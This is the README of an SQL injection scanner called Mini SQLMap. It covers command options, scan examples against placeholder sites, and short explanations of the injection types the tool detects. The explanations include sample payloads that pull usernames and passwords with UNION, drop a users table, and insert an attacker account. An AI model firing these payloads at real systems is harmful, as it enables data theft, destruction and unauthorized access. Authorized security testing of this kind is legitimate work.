# Mini SQLMap - SQL Injection Vulnerability Scanner

<div align="center">

**A powerful SQL injection vulnerability scanner for bug bounty hunters and security researchers**

[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Version](https://img.shields.io/badge/Version-1.0.0-red.svg)]()

</div>

---

## What is Mini SQLMap?

**Mini SQLMap** is a vulnerability scanner that helps you **find SQL injection vulnerabilities** in web applications. It's designed for:

- Bug Bounty Hunters - Find vulnerabilities to report for rewards
- Security Researchers - Audit applications for vulnerabilities
- Penetration Testers - Test SQL injection defenses
- Developers - Learn about SQL injection and secure coding

---

## Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/blaxkmiradev/mini-sqlmap.git
cd mini-sqlmap

# Install dependencies
pip install -r requirements.txt

# Run the tool
python mini_sqlmap.py --help
```

### Basic Scan

```bash
python mini_sqlmap.py -u "http://target.com/page?id=1"
```

---

## Command Options Explained

### Target Options (What to Scan)

| Option | Description | Example |
|--------|-------------|---------|
| `-u URL` | Single URL to scan | `-u "http://site.com/page?id=1"` |
| `-m FILE` | File with multiple URLs (one per line) | `-m urls.txt` |
| `-d DATA` | POST data to send with request | `-d "username=test&password=123"` |
| `--method METHOD` | HTTP method: GET or POST (default: GET) | `--method POST` |

### Authentication Options (For Protected Sites)

| Option | Description | Example |
|--------|-------------|---------|
| `--cookie "COOKIE"` | Session cookies for authenticated scanning | `--cookie "PHPSESSID=abc123"` |
| `--user-agent "AGENT"` | Custom User-Agent header | `--user-agent "Mozilla/5.0..."` |
| `-H "Header: Value"` | Add custom HTTP header | `-H "Authorization: Bearer token"` |

### Scanning Options (How to Scan)

| Option | Description | Example |
|--------|-------------|---------|
| `--risk 1/2/3` | Risk level (1=safe, 2=medium, 3=aggressive) | `--risk 2` |
| `-v 0-6` | Verbosity level (0=silent, 6=debug) | `-v 3` |
| `--dbms TYPE` | Force specific database type | `--dbms MySQL` |
| `--crawl DEPTH` | Crawl website to discover URLs | `--crawl 3` |
| `--crawl-max N` | Maximum URLs to crawl (default: 50) | `--crawl-max 100` |

### Network Options (Connection Settings)

| Option | Description | Example |
|--------|-------------|---------|
| `--proxy URL` | Use HTTP proxy | `--proxy "http://127.0.0.1:8080"` |
| `--delay SEC` | Delay between requests (seconds) | `--delay 1` |
| `--timeout SEC` | Request timeout (default: 30) | `--timeout 60` |
| `--retries N` | Retry attempts on failure | `--retries 3` |

### Output Options (Results)

| Option | Description | Example |
|--------|-------------|---------|
| `-o FILE` | Save results to file | `-o results.json` |
| `--format FORMAT` | Output format: json, html, or csv | `--format html` |
| `--batch` | Run without prompts (fully automated) | `--batch` |
| `--no-colors` | Disable colored output | `--no-colors` |

### Utility Options

| Option | Description | Example |
|--------|-------------|---------|
| `--version` | Show version information | `--version` |
| `--list-payloads` | List all SQL injection payloads | `--list-payloads` |
| `--help` | Show help message | `--help` |

---

## Risk Levels Explained

| Level | Name | What It Does | Safety |
|-------|------|--------------|--------|
| **1** | Low | Tests basic boolean and error-based injection | Safe - won't modify data |
| **2** | Medium | Adds time-based and union attacks | May cause slow responses |
| **3** | High | Includes stacked queries (can modify data) | Use with extreme caution |

**Recommendation**: Start with `--risk 1`, increase only if needed.

---

## Verbosity Levels Explained

| Level | Name | Output | Use Case |
|-------|------|--------|----------|
| **0** | Silent | Nothing | Automation/CI/CD |
| **1** | Normal | Basic info | Default scanning |
| **2** | Verbose | More details | Debugging |
| **3** | Debug | All details | Deep analysis |
| **4-6** | Very Debug | Everything | Development |

---

## Output Formats Explained

### JSON Format (`--format json`)

**Best for**: Automation, API integration, parsing by scripts

```bash
python mini_sqlmap.py -u "http://target.com/page?id=1" -o results.json --format json
```

**Output**: Structured data for programmatic use
```json
{
  "scan_info": {
    "timestamp": "2024-01-01T12:00:00",
    "tool": "Mini SQLMap",
    "version": "1.0.0"
  },
  "results": [
    {
      "url": "http://target.com/page?id=1",
      "parameter": "id",
      "type": "Error-based SQL Injection",
      "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
      "db_type": "MySQL"
    }
  ]
}
```

### HTML Format (`--format html`)

**Best for**: Reports, presentations, sharing with teams

```bash
python mini_sqlmap.py -u "http://target.com/page?id=1" -o report.html --format html
```

**Output**: Beautiful, styled web page with tables and colors

### CSV Format (`--format csv`)

**Best for**: Spreadsheet analysis, Excel, data import

```bash
python mini_sqlmap.py -u "http://target.com/page?id=1" -o results.csv --format csv
```

**Output**: Tabular data for Excel/Google Sheets

---

## Real-World Examples

### Example 1: Basic Scan

```bash
python mini_sqlmap.py -u "http://target.com/products?id=5"
```

**What it does**: 
- Scans the `id` parameter
- Tests boolean-based and error-based SQL injection
- Risk level 1 (safe)
- Shows results in console

---

### Example 2: Authenticated Scan

```bash
python mini_sqlmap.py -u "http://target.com/admin/search" \
    --cookie "PHPSESSID=abc123; user=admin" \
    --method POST \
    -d "search=term"
```

**What it does**:
- Uses session cookies to authenticate
- Sends POST request with data
- Tests the `search` parameter

---

### Example 3: Comprehensive Scan with Report

```bash
python mini_sqlmap.py -u "http://target.com/page?id=1" \
    --risk 2 \
    -v 3 \
    --format html \
    -o vulnerability_report.html
```

**What it does**:
- Uses risk level 2 (includes more tests)
- High verbosity (shows all details)
- Generates HTML report
- Saves to file

---

### Example 4: Batch Scanning

**Step 1**: Create a file `urls.txt`:
```
http://site1.com/page?id=1
http://site2.com/product?id=5
http://site3.com/search?q=test
```

**Step 2**: Run batch scan:
```bash
python mini_sqlmap.py -m urls.txt --format json -o batch_results.json --batch
```

**What it does**:
- Scans all URLs in the file
- Runs without prompts (batch mode)
- Saves all results to one JSON file

---

### Example 5: Crawl and Scan

```bash
python mini_sqlmap.py -u "http://target.com/" \
    --crawl 3 \
    --crawl-max 50 \
    --format html \
    -o crawled_report.html
```

**What it does**:
- Starts from homepage
- Crawls up to 3 levels deep
- Finds up to 50 URLs with parameters
- Scans each discovered URL
- Generates HTML report

---

### Example 6: Using Proxy for Testing

```bash
python mini_sqlmap.py -u "http://target.com/page?id=1" \
    --proxy "http://127.0.0.1:8080" \
    -v 3
```

**What it does**:
- Routes all traffic through proxy
- Useful for debugging with Burp Suite
- Shows detailed request/response info

---

### Example 7: Slow Scan with Delays

```bash
python mini_sqlmap.py -u "http://target.com/page?id=1" \
    --delay 2 \
    --timeout 60 \
    --retries 5
```

**What it does**:
- Waits 2 seconds between requests
- 60 second timeout per request
- Retries up to 5 times on failure
- Good for fragile/limited servers

---

### Example 8: Force Specific Database

```bash
python mini_sqlmap.py -u "http://target.com/page?id=1" \
    --dbms MySQL
```

**What it does**:
- Skips database detection
- Uses only MySQL-specific payloads
- Faster scanning if you know the DB type

---

## SQL Injection Types Detected

### 1. Boolean-Based Blind SQL Injection

**What it is**: Infers information based on true/false responses

**Example**: `http://target.com?id=1' AND 1=1--`

**When to use**: 
- No visible errors returned
- Application behaves differently for true/false
- Information is leaked through page content

**Payload example**:
```
' OR '1'='1
' AND 1=1--
```

---

### 2. Error-Based SQL Injection

**What it is**: Triggers database errors that reveal information

**Example**: `http://target.com?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--`

**When to use**:
- Database errors are displayed
- Useful for MySQL, PostgreSQL, MSSQL
- Reveals database version, table names, etc.

**Payload example**:
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
```

---

### 3. Time-Based Blind SQL Injection

**What it is**: Uses delays to infer true/false conditions

**Example**: `http://target.com?id=1' AND SLEEP(5)--`

**When to use**:
- No visible difference in responses
- Application doesn't show errors
- Network is stable (delays work)

**Payload example**:
```
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
```

---

### 4. Union-Based SQL Injection

**What it is**: Uses UNION to combine results from multiple queries

**Example**: `http://target.com?id=1' UNION SELECT NULL,NULL,NULL--`

**When to use**:
- Want to extract specific data
- Number of columns is known
- Application displays query results

**Payload example**:
```
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--
```

---

### 5. Stacked Queries

**What it is**: Executes multiple SQL statements

**Example**: `http://target.com?id=1'; DROP TABLE users--`

**When to use**:
- Need to execute multiple commands
- Want to insert/update/delete data
- Very powerful but destructive

**Payload example**:
```
'; SELECT * FROM users--
'; INSERT INTO users VALUES('hacker','password')--
```

**WARNING**: Can modify or delete data - use with extreme caution!

---

## Database Support

Mini SQLMap automatically detects and supports:

- **MySQL** - Most common, extensive payloads
- **PostgreSQL** - Strong PostgreSQL-specific tests
- **Microsoft SQL Server (MSSQL)** - Windows-focused
- **Oracle** - Enterprise databases
- **SQLite** - Lightweight, file-based

---

## Project Structure Explained

```
mini-sqlmap/
├── mini_sqlmap.py           # Main program (CLI entry point)
│
├── core/
│   ├── scanner.py          # Orchestrates the scanning process
│   ├── detector.py         # Detects vulnerabilities from responses
│   ├── http_client.py      # Handles HTTP requests
│   ├── database.py         # Identifies database type
│   └── crawler.py          # Discovers URLs on websites
│
├── payloads/
│   ├── blind.py            # Boolean-based payloads (54 total)
│   ├── error.py           # Error-based payloads (19 total)
│   ├── time.py            # Time-based payloads (37 total)
│   ├── union.py           # Union-based payloads (45 total)
│   └── stacked.py         # Stacked query payloads (41 total)
│
├── output/
│   ├── console.py         # Pretty console output
│   ├── json_writer.py     # JSON export
│   ├── html_writer.py     # HTML report generator
│   └── csv_writer.py      # CSV export
│
└── utils/
    ├── colors.py          # ANSI color codes & banner
    ├── logger.py          # Logging system
    └── helpers.py         # Utility functions
```

### What Each Module Does:

**core/scanner.py** - The main scanning engine
- Coordinates all scanning operations
- Manages test execution flow
- Collects and formats results

**core/detector.py** - Vulnerability detection
- Tests each payload type
- Analyzes responses for signs of vulnerability
- Returns detection results

**core/http_client.py** - HTTP communication
- Sends requests to target
- Handles cookies, headers, proxies
- Manages timeouts and retries

**core/database.py** - Database fingerprinting
- Identifies database type
- Tests database-specific payloads
- Extracts database information

**core/crawler.py** - Web crawling
- Discovers URLs on target website
- Finds forms and parameters
- Maps website structure

**payloads/*.py** - SQL injection payloads
- Organized by attack type
- Database-specific variants
- Tested and effective

**output/*.py** - Result formatting
- Converts results to different formats
- Creates styled reports
- Handles file output

---

## Color Codes Explained

The tool uses colors to make output easier to read:

| Color | Meaning | Example |
|-------|---------|---------|
| Red | Critical/Error/Vulnerable | Vulnerabilities found |
| Yellow | Warning/Attention | Scan warnings |
| Green | Success/Safe | No vulnerabilities |
| Blue | Information/URLs | Scanning info |
| Magenta | Method/POST | HTTP methods |
| White | Normal text | General output |
| Gray | Debug/Dim | Verbose details |

---

## Common Use Cases

### Bug Bounty Hunting

```bash
# Quick scan of interesting parameter
python mini_sqlmap.py -u "https://target.com/api?id=123" --risk 1 -v 2

# Comprehensive report
python mini_sqlmap.py -u "https://target.com/page?id=1" --risk 2 --format html -o report.html
```

### Penetration Testing

```bash
# Authenticated scan with cookies
python mini_sqlmap.py -u "https://target.com/admin/dashboard" \
    --cookie "session=abc123" \
    --risk 2 \
    -v 3 \
    --format json \
    -o pentest_results.json
```

### CI/CD Integration

```bash
# Silent scan for automation
python mini_sqlmap.py -u "http://target.com/api?id=1" -v 0 -o results.json --format json

# Check exit code
if [ $? -eq 0 ]; then
    echo "Scan complete - check results.json"
fi
```

### Learning SQL Injection

```bash
# List all payloads to learn
python mini_sqlmap.py --list-payloads

# Scan test environment
python mini_sqlmap.py -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -v 3
```

---

## Troubleshooting

### Issue: "URL is required"

**Solution**: Use `-u` flag to specify URL
```bash
python mini_sqlmap.py -u "http://target.com/page?id=1"
```

### Issue: "Invalid URL"

**Solution**: Make sure URL has http:// or https://
```bash
python mini_sqlmap.py -u "https://target.com/page?id=1"
```

### Issue: "No vulnerabilities found"

**Possible reasons**:
1. Target is not vulnerable
2. WAF/Protection blocking requests
3. Need higher risk level
4. Wrong parameter being tested

**Try**:
```bash
python mini_sqlmap.py -u "http://target.com/page?id=1" --risk 2 -v 3
```

### Issue: "Connection timeout"

**Solution**: Increase timeout
```bash
python mini_sqlmap.py -u "http://target.com/page?id=1" --timeout 60 --delay 2
```

### Issue: "Unicode encoding error"

**Solution**: Use `--no-colors` flag
```bash
python mini_sqlmap.py -u "http://target.com/page?id=1" --no-colors
```

---

## Best Practices

### DO

- Only scan targets you have permission to test
- Start with risk level 1
- Use `--delay` on fragile servers
- Save results to file for analysis
- Test in non-production environments first
- Use proxy for debugging (Burp Suite)

### DON'T

- Don't scan without authorization
- Don't use risk level 3 on production systems
- Don't run multiple aggressive scans simultaneously
- Don't ignore legal disclaimers
- Don't share results publicly without permission

---

## Legal Disclaimer

**IMPORTANT: FOR AUTHORIZED TESTING ONLY**

This tool is designed for:
- Security research
- Authorized penetration testing
- Bug bounty programs (with permission)
- Educational purposes

**Unauthorized scanning is illegal in most jurisdictions.**

By using this tool, you agree to:
- Only scan systems you have explicit permission to test
- Not use findings for malicious purposes
- Accept all responsibility for your actions
- Comply with applicable laws and regulations

---

## Contributing

Contributions are welcome! Here's how to help:

1. Fork the repository
2. Create your feature branch: `git checkout -b feature/AmazingFeature`
3. Commit changes: `git commit -m 'Add AmazingFeature'`
4. Push to branch: `git push origin feature/AmazingFeature`
5. Open a Pull Request

---

## Credits

**Author**: [Rikixz](https://github.com/blaxkmiradev) (@blaxkmiradev)

**Version**: 1.0.0

**License**: MIT License

---

## Resources

- [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

## Changelog

### v1.0.0 (2024)
- Initial release
- 5 SQL injection types
- 196+ payloads
- JSON, HTML, CSV output
- Web crawler
- Database fingerprinting
- Colored console output

---

<div align="center">

**Happy Hunting!**

*Made with by [Rikixz](https://github.com/blaxkmiradev)*

</div>
